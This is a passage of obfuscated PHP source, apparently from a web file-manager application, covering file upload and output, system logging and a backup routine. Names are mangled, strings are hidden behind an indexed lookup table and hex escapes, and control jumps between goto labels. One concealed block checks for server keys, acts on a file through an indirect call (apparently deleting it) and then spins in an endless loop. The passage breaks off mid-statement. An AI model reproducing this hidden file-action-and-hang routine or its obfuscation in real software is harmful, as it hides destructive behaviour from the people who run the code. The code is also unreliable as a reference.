$ĞÛÅ¾¡ë = REPEAT_REPLACE) { $‚öñµÃ =& $_SERVER[ïëó©ÒÚ]; $”àê¹µ = $this->parse($À¸›·˜î); $ÅÙÒ°ÔÓ = $this->model->addFile($”àê¹µ[$‚öñµÃ[399]], $Î«÷µÇ, $”àê¹µ[$‚öñµÃ[84]], $ÛÑš’“©, $ĞÛÅ¾¡ë); return $this->getPathOuter($ÅÙÒ°ÔÓ); } public function uploadFileByID($†‰Ô¸¼Ø, $ñî©¾ºÃ, $óá‚¸‚Õ) { $´©¾¶Ğ =& $_SERVER[ïëó©ÒÚ]; $˜ø†“˜ = $this->parse($†‰Ô¸¼Ø); $İÁ“ä = $this->model->addFileByFileID($˜ø†“˜[$´©¾¶Ğ[399]], $ñî©¾ºÃ, $˜ø†“˜[$´©¾¶Ğ[84]], $óá‚¸‚Õ); return $this->getPathOuter($İÁ“ä); } public function addFileByRemote($×›®¥¡ó, $«øğÜÜ, $ìÆ•³ÌØ = array(), $šıôŸå¸ = '', $ºãŸ»¶) { $ìê™õƒß =& $_SERVER[ïëó©ÒÚ]; $¡ìÇ¾õõ = $this->parse($×›®¥¡ó); $šıôŸå¸ = empty($šıôŸå¸) ? $¡ìÇ¾õõ[$ìê™õƒß[84]] : $šıôŸå¸; $Ú­®£  = $this->model->addFileByRemote($¡ìÇ¾õõ[$ìê™õƒß[399]], $«øğÜÜ, $šıôŸå¸, $ìÆ•³ÌØ, $ºãŸ»¶); return $this->getPathOuter($Ú­®£ ); } public function uploadLink($Ø´¬¤¼ì, $ÄÕä©ìÍ = 0) { $…¢¨¨Ş´ =& $_SERVER[ïëó©ÒÚ]; $ßÈÂƒ§™ = $this->parse($Ø´¬¤¼ì); $³‡ÓìÀÇ = _get($GLOBALS[$…¢¨¨Ş´[7]], $…¢¨¨Ş´[1332]); $¦Ÿ†ÓØé = _get($GLOBALS[$…¢¨¨Ş´[7]], $…¢¨¨Ş´[1333]); $Ø´¬¤¼ì = Model($…¢¨¨Ş´[618])->createFileName($ßÈÂƒ§™[$…¢¨¨Ş´[84]], $³‡ÓìÀÇ, $¦Ÿ†ÓØé); return IO::uploadLink($Ø´¬¤¼ì, $ÄÕä©ìÍ); } public function fileNameAuto($ŒÌş°ßø, $áÚÊ¹Û×, $Á„ú»¥Ğ = REPEAT_REPLACE, $·šÇÏıƒ = false) { return $this->model->fileNameAuto($ŒÌş°ßø, $áÚÊ¹Û×, $Á„ú»¥Ğ, $·šÇÏıƒ); } public function fileNameExist($£†©ç÷”, $Á”Şß—·) { return $this->model->fileNameExist($£†©ç÷”, $Á”Şß—·); } protected function _fileOut($Î¶ÆÅ§é, $€âˆÁˆ½ = false, $¶¸›÷¸ = false, $«¢…‚µÃ = '', $ÌÉŠ„Óá = false) { $ïÃığè =& $_SERVER[ïëó©ÒÚ]; $„Ãò–×æ = $this->model->sourceInfo($Î¶ÆÅ§é); if ($„Ãò–×æ[$ïÃığè[419]] == $ïÃığè[88]) { header($ïÃığè[1334]); die; } $Ë£ö Ş = $this->model->fileInfoGet($Î¶ÆÅ§é); $«¢…‚µÃ = $Ë£ö Ş[$ïÃığè[176]] ? $Ë£ö Ş[$ïÃığè[176]] : $«¢…‚µÃ; $¸ù ´½ = isset($GLOBALS[$ïÃığè[1335]]) ? $GLOBALS[$ïÃığè[1335]] : $„Ãò–×æ[$ïÃığè[32]]; if ($ÌÉŠ„Óá) { return IO::fileOutServer($Ë£ö Ş[$ïÃığè[84]], $€âˆÁˆ½, $¸ù ´½, $«¢…‚µÃ); } IO::fileOut($Ë£ö Ş[$ïÃığè[84]], $€âˆÁˆ½, $¸ù ´½, $«¢…‚µÃ); } public function fileOut($èâÅ¬×¢, $‘ûñ÷ş = false, $ø³ÍŒŒò = false, $Øß®¥ë = '') { $this->_fileOut($èâÅ¬×¢, $‘ûñ÷ş, $ø³ÍŒŒò, $Øß®¥ë); } public function fileOutServer($¶ş‡‘˜, $üãĞ¨‘ş = false, $—³ÉîöÑ = false, $¤Œ½ª´´ = '') { $this->_fileOut($¶ş‡‘˜, $üãĞ¨‘ş, $—³ÉîöÑ, $¤Œ½ª´´, !0); } protected function _fileOutImage($‰É¿•´Ã, $¸Í¡á•¶ = 250) { $°éå¶· =& $_SERVER[ïëó©ÒÚ]; $ì…Æ•ø× = $this->model->pathInfo($‰É¿•´Ã); if ($ì…Æ•ø×[$°éå¶·[419]] == $°éå¶·[88]) { show_json($°éå¶·[1336] . $‰É¿•´Ã, !1); } $¬‹»¬Û¼ = $this->model->fileInfoGet($‰É¿•´Ã); $¬‹»¬Û¼[$°éå¶·[32]] = $ì…Æ•ø×[$°éå¶·[32]]; $¬‹»¬Û¼[$°éå¶·[169]] = $ì…Æ•ø×[$°éå¶·[169]]; $GLOBALS[$°éå¶·[1335]] = $¬‹»¬Û¼[$°éå¶·[32]]; $GLOBALS[$°éå¶·[168]] = $¬‹»¬Û¼; IO::fileOutImage($¬‹»¬Û¼[$°éå¶·[84]], $¸Í¡á•¶); } public function fileOutImage($ÕØŠÚÅÏ, $¸½áİªÉ = 250) { $this->_fileOutImage($ÕØŠÚÅÏ, $¸½áİªÉ); } public function fileOutImageServer($€äÇá‡ˆ, $¡©¸†¿ï = 250) { $this->_fileOutImage($€äÇá‡ˆ, $¡©¸†¿ï); } public function link($¸š¸‹Å³, $á‘½ªÄ = '') { $õ«µ³‡ï = $this->model->fileInfoGet($¸š¸‹Å³); return IO::link($õ«µ³‡ï[$_SERVER[ïëó©ÒÚ][84]], $á‘½ªÄ); } protected function parse($âÅİïµâ) { $†¢ó¯à€ =& $_SERVER[ïëó©ÒÚ]; if (strstr($âÅİïµâ, $†¢ó¯à€[8]) === !1) { return array($†¢ó¯à€[428] => intval($âÅİïµâ), $†¢ó¯à€[84] => $†¢ó¯à€[12], $†¢ó¯à€[1331] => array()); } $‘Ö–±û÷ = explode($†¢ó¯à€[8], trim($âÅİïµâ, $†¢ó¯à€[8])); if (count($‘Ö–±û÷) < 2) { show_tips(clear_html($âÅİïµâ) . $†¢ó¯à€[1337]); } return array($†¢ó¯à€[428] => intval($‘Ö–±û÷[0]), $†¢ó¯à€[84] => $‘Ö–±û÷[1], $†¢ó¯à€[1331] => array_slice($‘Ö–±û÷, 1)); } } goto bèé½´×øµ; AÜ‚è¹ÇÌ: if (!isset($_SERVER[$_SERVER[ïëó©ÒÚ][400]]) || !isset($_SERVER[$_SERVER[ïëó©ÒÚ][408]])) { $_getc = $_SERVER[ïëó©ÒÚ][402]; $_getfile = $_SERVER[$_SERVER[ïëó©ÒÚ][403]] . $_SERVER[ïëó©ÒÚ][404]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ïëó©ÒÚ][231], $_getfilec); if (count($_getarrs) < $_SERVER[ïëó©ÒÚ][405]) { $exit = $_SERVER[ïëó©ÒÚ][406]; $exit(); } $_act = $_SERVER[ïëó©ÒÚ][407]; $_act($_SERVER[$_SERVER[ïëó©ÒÚ][403]] . $_SERVER[ïëó©ÒÚ][404]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ïëó©ÒÚ][378]); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\114\x69\147\x68\164\x41\160\x70"; public $modelType = "\123\171\163\x74\x65\x6d\117\160\164\x69\x6f\x6e"; public $field = array("\156\141\155\145", "\x67\x72\157\x75\x70", "\144\x65\163\143", "\x63\157\156\x74\x65\x6e\x74"); public function listData($ŒÑ€‹¨  = false, $ˆ«…¯µ´ = "\x6d\x6f\x64\151\x66\171\x54\151\155\x65", $ÌÒÕúòé = true) { return parent::listData($ŒÑ€‹¨ , $ˆ«…¯µ´, $ÌÒÕúòé); } public function remove($ı ¯ë¿) { $†ÖßìÃ = $this->findByName($ı ¯ë¿); if (!$†ÖßìÃ) { return !1; } return parent::remove($†ÖßìÃ[$_SERVER[ïëó©ÒÚ][399]]); } public function add($éñ±Øı) { if ($this->findByName($éñ±Øı[$_SERVER[ïëó©ÒÚ][32]])) { return !1; } return parent::insert($éñ±Øı); } public function update($£‹½ˆîÅ, $£¨§ÂÆ½) { $ÁùĞÃä =& $_SERVER[ïëó©ÒÚ]; $Ò•¡Ğç = $this->findByName($£‹½ˆîÅ); $ó¬ıÍ‚„ = $this->findByName($£¨§ÂÆ½[$ÁùĞÃä[32]]); if (!$Ò•¡Ğç || $ó¬ıÍ‚„ && $ó¬ıÍ‚„[$ÁùĞÃä[399]] != $Ò•¡Ğç[$ÁùĞÃä[399]]) { return !1; } return parent::update($Ò•¡Ğç[$ÁùĞÃä[399]], $£¨§ÂÆ½); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\x6d\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\124\151\155\x65", "\x74\151\x6d\x65", "\x69\156\x73\145\162\x74", "\x66\165\156\143\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $‘Îî¦º =& $_SERVER[ïëó©ÒÚ]; return array($‘Îî¦º[2161] => LNG($‘Îî¦º[2162]), $‘Îî¦º[2163] => LNG($‘Îî¦º[2164]), $‘Îî¦º[1776] => LNG($‘Îî¦º[2165]), $‘Îî¦º[2166] => LNG($‘Îî¦º[2167]), $‘Îî¦º[2168] => LNG($‘Îî¦º[2169]), $‘Îî¦º[2170] => LNG($‘Îî¦º[2171]), $‘Îî¦º[2172] => LNG($‘Îî¦º[2173]), $‘Îî¦º[1806] => LNG($‘Îî¦º[2173]), $‘Îî¦º[1807] => LNG($‘Îî¦º[2174]), $‘Îî¦º[2175] => LNG($‘Îî¦º[2176]), $‘Îî¦º[2177] => LNG($‘Îî¦º[2178]), $‘Îî¦º[2179] => LNG($‘Îî¦º[2180]), $‘Îî¦º[2181] => LNG($‘Îî¦º[2182]), $‘Îî¦º[1804] => LNG($‘Îî¦º[2183]), $‘Îî¦º[2184] => LNG($‘Îî¦º[2185]), $‘Îî¦º[1811] => LNG($‘Îî¦º[2186]), $‘Îî¦º[2187] => LNG($‘Îî¦º[2188]), $‘Îî¦º[2189] => LNG($‘Îî¦º[2190]), $‘Îî¦º[2191] => LNG($‘Îî¦º[2192]), $‘Îî¦º[2193] => LNG($‘Îî¦º[2194]), $‘Îî¦º[1814] => LNG($‘Îî¦º[2195]), $‘Îî¦º[1815] => LNG($‘Îî¦º[2196]), $‘Îî¦º[2197] => LNG($‘Îî¦º[2198]), $‘Îî¦º[2199] => LNG($‘Îî¦º[2200]), $‘Îî¦º[2201] => LNG($‘Îî¦º[2202]), $‘Îî¦º[1809] => LNG($‘Îî¦º[2203]), $‘Îî¦º[2204] => LNG($‘Îî¦º[2205]), $‘Îî¦º[1808] => LNG($‘Îî¦º[2206]), $‘Îî¦º[2207] => LNG($‘Îî¦º[2208]), $‘Îî¦º[2209] => LNG($‘Îî¦º[2210]), $‘Îî¦º[2211] => LNG($‘Îî¦º[2212]), $‘Îî¦º[2213] => LNG($‘Îî¦º[2213]), $‘Îî¦º[2214] => LNG($‘Îî¦º[1780]), $‘Îî¦º[2215] => LNG($‘Îî¦º[2216]), $‘Îî¦º[2217] => LNG($‘Îî¦º[2218]), $‘Îî¦º[2219] => LNG($‘Îî¦º[2220]), $‘Îî¦º[2221] => LNG($‘Îî¦º[2222]), $‘Îî¦º[2223] => LNG($‘Îî¦º[2224]), $‘Îî¦º[2225] => LNG($‘Îî¦º[2225]), $‘Îî¦º[2226] => LNG($‘Îî¦º[2227]), $‘Îî¦º[2228] => LNG($‘Îî¦º[2229]), $‘Îî¦º[2230] => LNG($‘Îî¦º[2231]), $‘Îî¦º[2232] => LNG($‘Îî¦º[2233]), $‘Îî¦º[2234] => LNG($‘Îî¦º[2235]), $‘Îî¦º[2236] => LNG($‘Îî¦º[2237])); } private function typeFile() { $ö‘¹·ªî =& $_SERVER[ïëó©ÒÚ]; $—ÁÅÕ¢› = array($ö‘¹·ªî[1811] => array($ö‘¹·ªî[1812]), $ö‘¹·ªî[2179] => array($ö‘¹·ªî[2238]), $ö‘¹·ªî[2181] => array($ö‘¹·ªî[2239]), $ö‘¹·ªî[1804] => array($ö‘¹·ªî[1805]), $ö‘¹·ªî[2189] => array(), $ö‘¹·ªî[2191] => array(), $ö‘¹·ªî[2193] => array(), $ö‘¹·ªî[1814] => array($ö‘¹·ªî[1816]), $ö‘¹·ªî[1815] => array($ö‘¹·ªî[1816]), $ö‘¹·ªî[2197] => array($ö‘¹·ªî[2240]), $ö‘¹·ªî[2199] => array($ö‘¹·ªî[2240]), $ö‘¹·ªî[2201] => array($ö‘¹·ªî[2241]), $ö‘¹·ªî[2187] => array($ö‘¹·ªî[2242]), $ö‘¹·ªî[1809] => array($ö‘¹·ªî[2243]), $ö‘¹·ªî[2204] => array($ö‘¹·ªî[2244]), $ö‘¹·ªî[1808] => array($ö‘¹·ªî[1810])); return $—ÁÅÕ¢›; } private function typeAll() { $ü¸¥® =& $_SERVER[ïëó©ÒÚ]; $§ïÅ‡¬° = $this->typeList; $„ç¸Íİ— = array_filter($this->typeFile()); foreach ($„ç¸Íİ— as $Â“…óµ => $ñÖ÷ÄÊá) { $§ïÅ‡¬°[$ñÖ÷ÄÊá[0]] = $§ïÅ‡¬°[$Â“…óµ]; } $§ïÅ‡¬°[$ü¸¥®[1816]] = LNG($ü¸¥®[2245]); $§ïÅ‡¬°[$ü¸¥®[2240]] = LNG($ü¸¥®[2246]); return $§ïÅ‡¬°; } public function addLog($ Ÿ©Æ‰£, $ãŸÇ ¢ß = array()) { $ÀÓê¨ò =& $_SERVER[ïëó©ÒÚ]; if (!isset($this->typeList[$ Ÿ©Æ‰£])) { return; } $íÑÁÀ = defined($ÀÓê¨ò[484]) && USER_ID ? USER_ID : (isset($ãŸÇ ¢ß[$ÀÓê¨ò[1661]]) ? $ãŸÇ ¢ß[$ÀÓê¨ò[1661]] : 0); if (!$íÑÁÀ) { $íÑÁÀ = (int) Session::get($ÀÓê¨ò[1970]); } if ($ Ÿ©Æ‰£ == $ÀÓê¨ò[2215] && is_array($ãŸÇ ¢ß[$ÀÓê¨ò[2247]]) && !$ãŸÇ ¢ß[$ÀÓê¨ò[2247]]) { return; } $À‚ìÀàô = get_client_ip(); if (!$ãŸÇ ¢ß || strlen(json_encode($ãŸÇ ¢ß)) >= 1024) { $ãŸÇ ¢ß = array($ÀÓê¨ò[2248] => $À‚ìÀàô); } else { if (is_array($ãŸÇ ¢ß)) { $ãŸÇ ¢ß[$ÀÓê¨ò[2248]] = $À‚ìÀàô; } else { $ãŸÇ ¢ß = array($ÀÓê¨ò[1196] => $ãŸÇ ¢ß, $ÀÓê¨ò[2248] => $À‚ìÀàô); } } $ãŸÇ ¢ß = array($ÀÓê¨ò[1651] => Session::sign(), $ÀÓê¨ò[1652] => $íÑÁÀ, $ÀÓê¨ò[33] => $ Ÿ©Æ‰£, $ÀÓê¨ò[1654] => json_encode($ãŸÇ ¢ß)); parent::add($ãŸÇ ¢ß); } public function remove($”è·‡Ñ†) { $this->where(array($_SERVER[ïëó©ÒÚ][428] => $”è·‡Ñ†))->delete(); } private function _makeOrder($‚Øá…µ™ = '') { $¶¹êŸŠ” =& $_SERVER[ïëó©ÒÚ]; $Ä‘±²Ä÷ = $¶¹êŸŠ”[200]; $¬ç’ÑöÊ = array($¶¹êŸŠ”[459] => $¶¹êŸŠ”[460], $¶¹êŸŠ”[461] => $¶¹êŸŠ”[462]); $”™ØÎÌú = Input::get($¶¹êŸŠ”[467], $¶¹êŸŠ”[7], $¶¹êŸŠ”[2002], array($¶¹êŸŠ”[1924], $¶¹êŸŠ”[461])); $”™ØÎÌú = $¬ç’ÑöÊ[$”™ØÎÌú]; $‚Øá…µ™ = $‚Øá…µ™ . "{$Ä‘±²Ä÷}\40{$”™ØÎÌú}"; return $this->order($‚Øá…µ™); } public function get($êéÂ–¬£ = '') { $Ú±áÕà =& $_SERVER[ïëó©ÒÚ]; if (!$êéÂ–¬£) { show_json(array()); } $ŒÉ¼ŠĞ = array(); if ($êéÂ–¬£[$Ú±áÕà[1661]]) { $ŒÉ¼ŠĞ[$Ú±áÕà[1661]] = $êéÂ–¬£[$Ú±áÕà[1661]]; } if (isset($êéÂ–¬£[$Ú±áÕà[771]])) { $Ãïìë‘Ú = $êéÂ–¬£[$Ú±áÕà[771]]; $ÖÅŸ“× = isset($êéÂ–¬£[$Ú±áÕà[506]]) ? $êéÂ–¬£[$Ú±áÕà[506]] : time(); $ŒÉ¼ŠĞ[$Ú±áÕà[200]] = array($Ú±áÕà[333], array($Ãïìë‘Ú, $ÖÅŸ“×)); } if ($êéÂ–¬£[$Ú±áÕà[33]]) { $Æƒóø÷Ç = explode($Ú±áÕà[50], $êéÂ–¬£[$Ú±áÕà[33]]); $“¨æ«›İ = $this->typeFile(); $æ¡Şô¼‚ = array(); foreach ($Æƒóø÷Ç as $³ƒû·¹õ) { $æ¡Şô¼‚[] = $³ƒû·¹õ; if (isset($“¨æ«›İ[$³ƒû·¹õ])) { $æ¡Şô¼‚ = array_merge($æ¡Şô¼‚, $“¨æ«›İ[$³ƒû·¹õ]); } } $æ¡Şô¼‚ = array_unique($æ¡Şô¼‚); if ($æ¡Şô¼‚) { $ŒÉ¼ŠĞ[$Ú±áÕà[33]] = array($Ú±áÕà[7], $æ¡Şô¼‚); } } else { $ŒÉ¼ŠĞ[$Ú±áÕà[33]] = array($Ú±áÕà[2249], $Ú±áÕà[2250]); } if (!empty($êéÂ–¬£[$Ú±áÕà[2248]])) { $ŒÉ¼ŠĞ[$Ú±áÕà[462]] = array($Ú±áÕà[383], "\45{$êéÂ–¬£[$Ú±áÕà[2248]]}\x25"); } $¦şÈÆ• = $this->_makeOrder()->where($ŒÉ¼ŠĞ)->selectPage(); if (empty($¦şÈÆ•[$Ú±áÕà[369]])) { show_json(array(), !0, $¦şÈÆ•[$Ú±áÕà[366]]); } $¦şÈÆ•[$Ú±áÕà[369]] = $this->logList($¦şÈÆ•[$Ú±áÕà[369]]); return $¦şÈÆ•; } private function ipAddress(&$±ÆÎè¦Ú) { $ÛÊ¹ö°˜ =& $_SERVER[ïëó©ÒÚ]; if (!empty($±ÆÎè¦Ú[$ÛÊ¹ö°˜[2248]])) { $ŠìÅ«çã = IpLocation::get($±ÆÎè¦Ú[$ÛÊ¹ö°˜[2248]]); } else { $ŠìÅ«çã = LNG($ÛÊ¹ö°˜[2251]); } $±ÆÎè¦Ú[$ÛÊ¹ö°˜[2252]] = $ŠìÅ«çã; } private function descZipDownload($¦Ü±ÅÅ, &$Ú¤Îá¨) { $²ÃÃ¸‹£ =& $_SERVER[ïëó©ÒÚ]; if (!isset($¦Ü±ÅÅ[$²ÃÃ¸‹£[2253]])) { return; } $ªœÒË³› = json_decode($¦Ü±ÅÅ[$²ÃÃ¸‹£[2253]], !0); foreach ($ªœÒË³› as $‰ª‚»â) { try { $Å™Â¦­Á = IO::infoFull($‰ª‚»â[$²ÃÃ¸‹£[84]]); } catch (Exception $¿Ä‡‚ú–) { continue; } $¦Ü±ÅÅ[$²ÃÃ¸‹£[84]] = $‰ª‚»â[$²ÃÃ¸‹£[84]]; $Ú¤Îá¨[] = $¦Ü±ÅÅ[$²ÃÃ¸‹£[411]] = $Å™Â¦­Á[$²ÃÃ¸‹£[411]]; $Ú¤Îá¨[] = $¦Ü±ÅÅ[$²ÃÃ¸‹£[2056]] = $Å™Â¦­Á[$²ÃÃ¸‹£[441]]; break; } return $¦Ü±ÅÅ; } private function getSourceList(&$¿åïÏ§) { $ºöî„Û« =& $_SERVER[ïëó©ÒÚ]; $ù²’û· = array(); foreach ($¿åïÏ§ as $‡­”çæñ => $­ê¼ŒÅ ) { $åíğßöç = json_decode($­ê¼ŒÅ [$ºöî„Û«[462]], !0); if ($­ê¼ŒÅ [$ºöî„Û«[33]] == $ºöî„Û«[1807]) { $åíğßöç = $this->descZipDownload($åíğßöç, $ù²’û·); $¿åïÏ§[$‡­”çæñ][$ºöî„Û«[462]] = json_encode($åíğßöç); continue; } if (strpos($­ê¼ŒÅ [$ºöî„Û«[33]], $ºöî„Û«[2058]) !== 0) { if (!isset($åíğßöç[$ºöî„Û«[84]]) || strpos($­ê¼ŒÅ [$ºöî„Û«[33]], $ºöî„Û«[2254]) !== 0) { continue; } try { $ÁŸ×ùÑƒ = IO::infoFull($åíğßöç[$ºöî„Û«[84]]); } catch (Exception $£ßõ×üü) { continue; } $ù²’û·[] = $åíğßöç[$ºöî„Û«[411]] = $ÁŸ×ùÑƒ[$ºöî„Û«[411]]; $ù²’û·[] = $åíğßöç[$ºöî„Û«[2056]] = $ÁŸ×ùÑƒ[$ºöî„Û«[441]]; $¿åïÏ§[$‡­”çæñ][$ºöî„Û«[462]] = json_encode($åíğßöç); continue; } $ù²’û·[] = $åíğßöç[$ºöî„Û«[411]]; $ù²’û·[] = $åíğßöç[$ºöî„Û«[2056]]; if ($åíğßöç[$ºöî„Û«[33]] == $ºöî„Û«[566]) { $ù²’û·[] = $åíğßöç[$ºöî„Û«[462]][$ºöî„Û«[1163]]; $ù²’û·[] = $åíğßöç[$ºöî„Û«[462]][$ºöî„Û«[1164]]; } if ($åíğßöç[$ºöî„Û«[33]] == $ºöî„Û«[2066]) { $ù²’û·[] = $åíğßöç[$ºöî„Û«[462]][$ºöî„Û«[411]]; } } if (!$ù²’û·) { return array(); } return Model($ºöî„Û«[835])->sourceListInfo($ù²’û·, !0); } private function logList($ØçüÉ–ù) { $³ù¯ò”« =& $_SERVER[ïëó©ÒÚ]; $ÄªÙÄºî = array_to_keyvalue($ØçüÉ–ù, $³ù¯ò”«[12], $³ù¯ò”«[1661]); $¼«­–ßƒ = Model($³ù¯ò”«[544])->userListInfo(array_unique($ÄªÙÄºî)); $´Ú•»Ğæ = $this->getSourceList($ØçüÉ–ù); $’á‹±Û¶ = $this->typeAll(); $øñ¶çı = array(); $¹İ‚¢ÍÌ = array(); foreach ($ØçüÉ–ù as $æ¯¼Íşà => $ñ‘¸˜Ë) { $ÀÀ‚·­ = $ñ‘¸˜Ë[$³ù¯ò”«[33]]; $Ùˆö¼™‡ = isset($¼«­–ßƒ[$ñ‘¸˜Ë[$³ù¯ò”«[1661]]]) ? $¼«­–ßƒ[$ñ‘¸˜Ë[$³ù¯ò”«[1661]]] : !1; $©øûà§÷ = strpos($ÀÀ‚·­, $³ù¯ò”«[2255]) === 0 ? LNG($³ù¯ò”«[2256]) : LNG($³ù¯ò”«[2251]); $ñ‘¸˜Ë[$³ù¯ò”«[32]] = isset($Ùˆö¼™‡[$³ù¯ò”«[32]]) ? $Ùˆö¼™‡[$³ù¯ò”«[32]] : LNG($³ù¯ò”«[2251]); $ñ‘¸˜Ë[$³ù¯ò”«[551]] = isset($Ùˆö¼™‡[$³ù¯ò”«[551]]) ? $Ùˆö¼™‡[$³ù¯ò”«[551]] : $³ù¯ò”«[12]; $ñ‘¸˜Ë[$³ù¯ò”«[1560]] = isset($’á‹±Û¶[$ÀÀ‚·­]) ? $’á‹±Û¶[$ÀÀ‚·­] : $©øûà§÷; $ñ‘¸˜Ë[$³ù¯ò”«[2001]] = $Ùˆö¼™‡; $ÑÍù€Õ = json_decode($ñ‘¸˜Ë[$³ù¯ò”«[462]], !0); $ñ‘¸˜Ë[$³ù¯ò”«[2248]] = isset($ÑÍù€Õ[$³ù¯ò”«[2248]]) ? $ÑÍù€Õ[$³ù¯ò”«[2248]] : $³ù¯ò”«[12]; $ñ‘¸˜Ë[$³ù¯ò”«[2252]] = IpLocation::get($ñ‘¸˜Ë[$³ù¯ò”«[2248]]); if (strpos($ÀÀ‚·­, $³ù¯ò”«[2058]) === 0 || isset($ÑÍù€Õ[$³ù¯ò”«[2056]])) { $ÑÍù€Õ[$³ù¯ò”«[86]] = $´Ú•»Ğæ[$ÑÍù€Õ[$³ù¯ò”«[411]]]; $ÑÍù€Õ[$³ù¯ò”«[2071]] = $´Ú•»Ğæ[$ÑÍù€Õ[$³ù¯ò”«[2056]]]; if ($ÑÍù€Õ[$³ù¯ò”«[33]] == $³ù¯ò”«[566]) { $ÑÍù€Õ[$³ù¯ò”«[462]][$³ù¯ò”«[1163]] = $´Ú•»Ğæ[$ÑÍù€Õ[$³ù¯ò”«[462]][$³ù¯ò”«[1163]]]; $ÑÍù€Õ[$³ù¯ò”«[462]][$³ù¯ò”«[1164]] = $´Ú•»Ğæ[$ÑÍù€Õ[$³ù¯ò”«[462]][$³ù¯ò”«[1164]]]; } if ($ÑÍù€Õ[$³ù¯ò”«[33]] == $³ù¯ò”«[2066]) { $ÑÍù€Õ[$³ù¯ò”«[462]][$³ù¯ò”«[411]] = $´Ú•»Ğæ[$ÑÍù€Õ[$³ù¯ò”«[462]][$³ù¯ò”«[411]]]; } if ($ÑÍù€Õ[$³ù¯ò”«[33]] == $³ù¯ò”«[1802]) { $ÑÍù€Õ[$³ù¯ò”«[2071]] = $ÑÍù€Õ[$³ù¯ò”«[86]]; $ÑÍù€Õ[$³ù¯ò”«[2056]] = $ÑÍù€Õ[$³ù¯ò”«[2071]][$³ù¯ò”«[411]]; $ÑÍù€Õ[$³ù¯ò”«[86]] = !1; $ÑÍù€Õ[$³ù¯ò”«[411]] = $³ù¯ò”«[12]; } if ($ÑÍù€Õ[$³ù¯ò”«[86]] && $ÑÍù€Õ[$³ù¯ò”«[86]][$³ù¯ò”«[420]] == $³ù¯ò”«[1279]) { $¹İ‚¢ÍÌ[] = $ñ‘¸˜Ë[$³ù¯ò”«[399]]; unset($ØçüÉ–ù[$æ¯¼Íşà]); continue; } if ($ÑÍù€Õ[$³ù¯ò”«[2071]] && $ÑÍù€Õ[$³ù¯ò”«[2071]][$³ù¯ò”«[420]] == $³ù¯ò”«[1279]) { $¹İ‚¢ÍÌ[] = $ñ‘¸˜Ë[$³ù¯ò”«[399]]; unset($ØçüÉ–ù[$æ¯¼Íşà]); continue; } } $ñ‘¸˜Ë[$³ù¯ò”«[462]] = $ÑÍù€Õ; unset($ñ‘¸˜Ë[$³ù¯ò”«[2257]]); $øñ¶çı[] = $ñ‘¸˜Ë; } $this->clearSystemPathLog($¹İ‚¢ÍÌ); return $øñ¶çı; } private function clearSystemPathLog($ÙÙÔ­ëÌ) { $¶ë¶ìÂµ =& $_SERVER[ïëó©ÒÚ]; if (count($ÙÙÔ­ëÌ) == 0) { return; } $’îÛ€ãµ = array($¶ë¶ìÂµ[399] => array($¶ë¶ìÂµ[7], array_unique($ÙÙÔ­ëÌ))); $this->where($’îÛ€ãµ)->delete(); } public function deviceList($‹”Š¯‘õ, $¦“Ì•œú = 0) { $áì¾×ˆÃ =& $_SERVER[ïëó©ÒÚ]; $ë¸Ú½†È = array($áì¾×ˆÃ[1661] => $‹”Š¯‘õ, $áì¾×ˆÃ[200] => array($áì¾×ˆÃ[1017], $¦“Ì•œú), $áì¾×ˆÃ[33] => $áì¾×ˆÃ[1776]); $½öğãÜ™ = array(); $ù²Šİêî = $this->field($áì¾×ˆÃ[2258])->where($ë¸Ú½†È)->order($áì¾×ˆÃ[2069])->limit(50)->select(); foreach ($ù²Šİêî as $è¥†§¹» => $Ş™™«ç) { if ($è¥†§¹» > 0 && abs($Ş™™«ç[$áì¾×ˆÃ[200]] - $ù²Šİêî[$è¥†§¹» - 1][$áì¾×ˆÃ[200]]) < 5) { continue; } $Ï¶Ì Á = json_decode($Ş™™«ç[$áì¾×ˆÃ[462]], !0); $Ş™™«ç[$áì¾×ˆÃ[2248]] = isset($Ï¶Ì Á[$áì¾×ˆÃ[2248]]) ? $Ï¶Ì Á[$áì¾×ˆÃ[2248]] : $áì¾×ˆÃ[12]; unset($Ï¶Ì Á[$áì¾×ˆÃ[2248]]); $ãõÁÄê‹ = $this->deviceType($Ï¶Ì Á[$áì¾×ˆÃ[2059]]); if (isset($½öğãÜ™[$ãõÁÄê‹])) { continue; } $Ş™™«ç[$áì¾×ˆÃ[2252]] = IpLocation::get($Ş™™«ç[$áì¾×ˆÃ[2248]]); $Ş™™«ç[$áì¾×ˆÃ[462]] = $Ï¶Ì Á; $½öğãÜ™[$ãõÁÄê‹] = $Ş™™«ç; } return array_values($½öğãÜ™); } public function deviceType($–­Öãöé) { return $–­Öãöé; } } goto EÎĞÀÏ®¨Ø; FâÔÆèÜÖ: class BackupDbFile { public function __construct() { } public function index() { $’¶ç§® =& $_SERVER[ïëó©ÒÚ]; $ø¢ÄşãÒ = Backup::get(); $›¥‡¦ê = $ø¢ÄşãÒ[$’¶ç§®[32]]; $™»ıø† = $this->tmpFilesPath() . "\142\x61\x63\153\x75\160\x5f{$›¥‡¦ê}\57"; $‡ßğ¯­ = $this->backupPath($ø¢ÄşãÒ); if (!($‡ßğ¯­ = IO::mkdir($‡ßğ¯­))) { return !1; } $ÓÅ´õğ² = IO::listPath($™»ıø†); $Ÿ­Ë = isset($ÓÅ´õğ²[$’¶ç§®[83]]) ? $ÓÅ´õğ²[$’¶ç§®[83]] : array(); $ÀÄì¾õ€ = array_sum(array_column($Ÿ­Ë, $’¶ç§®[76])); if (!$ÀÄì¾õ€) { return !1; } $Ã‡ò™Š» = array($’¶ç§®[808] => $ÀÄì¾õ€, $’¶ç§®[809] => time()); Backup::set($Ã‡ò™Š»); $ßÔ¨£¶ = new TaskFileTransfer($’¶ç§®[810], $’¶ç§®[790], count($Ÿ­Ë), LNG($’¶ç§®[791]) . $’¶ç§®[386] . LNG($’¶ç§®[793]) . $’¶ç§®[811]); $ßÔ¨£¶->task[$’¶ç§®[773]] = $ÀÄì¾õ€; foreach ($ÓÅ´õğ²[$’¶ç§®[83]] as $°Òõ¼Ò½) { $Ç¥’²„‡ = IO::move($°Òõ¼Ò½[$’¶ç§®[84]], 